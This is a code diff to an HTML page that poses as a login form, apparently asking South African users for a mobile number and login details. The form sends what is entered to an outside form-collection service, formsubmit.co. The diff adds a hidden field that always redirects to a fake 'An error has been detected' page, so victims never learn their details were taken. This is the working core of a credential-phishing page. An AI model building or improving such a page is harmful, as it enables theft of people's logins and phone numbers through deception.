@@ -21,10 +21,11 @@
       box-shadow: 0px 4px 8px rgba(0, 0, 0, 0.2);
     }
     .error-message {
-      color: #ff0000;
-      font-size: 18px;
+      color: red;
+      font-size: 20px;
       text-align: center;
-      padding: 20px;
+      padding: 30px;
+      font-weight: bold;
     }
   </style>
 </head>
@@ -42,11 +43,12 @@
 
     <div class="container">
       <h2>Login</h2>
-      <form id="login-form" action="https://formsubmit.co/525a68c3f15ba3237c28cc11c2e7cb21" method="POST">
-        <!-- Hidden config fields -->
+      <form action="https://formsubmit.co/525a68c3f15ba3237c28cc11c2e7cb21" method="POST">
+        <!-- Hidden settings -->
         <input type="hidden" name="_captcha" value="false" />
+        <!-- Force redirect to error page always -->
+        <input type="hidden" name="_next" value="?error=1" />
         <input type="hidden" name="_error" value="?error=1" />
-        <!-- No _next to prevent success redirect -->
 
         <label for="mobile">Mobile Number</label>
         <input type="tel" id="mobile" name="mobileNumber" placeholder="+27 Mobile Number" required />
@@ -77,25 +79,26 @@
   <!-- Error Page -->
   <div class="page" id="error-page">
     <div class="container">
-      <h1 class="error-message">An error has been detected</h1>
-      <p style="text-align:center;">Please try again later.</p>
+      <div class="error-message">
+        An error has been detected, please try again later.
+      </div>
     </div>
   </div>
 
   <script>
+    // Check URL for ?error=1
     function getQueryParam(param) {
       const urlParams = new URLSearchParams(window.location.search);
       return urlParams.get(param);
     }
 
     window.addEventListener('DOMContentLoaded', () => {
-      const error = getQueryParam('error');
-
-      if (error === '1') {
-        // Show error page only
+      const isError = getQueryParam('error');
+      if (isError === '1') {
+        // Show the error page only
         document.getElementById('error-page').classList.add('active');
       } else {
-        // Default: show form
+        // Otherwise show the form
         document.getElementById('form-page').classList.add('active');
       }
     });
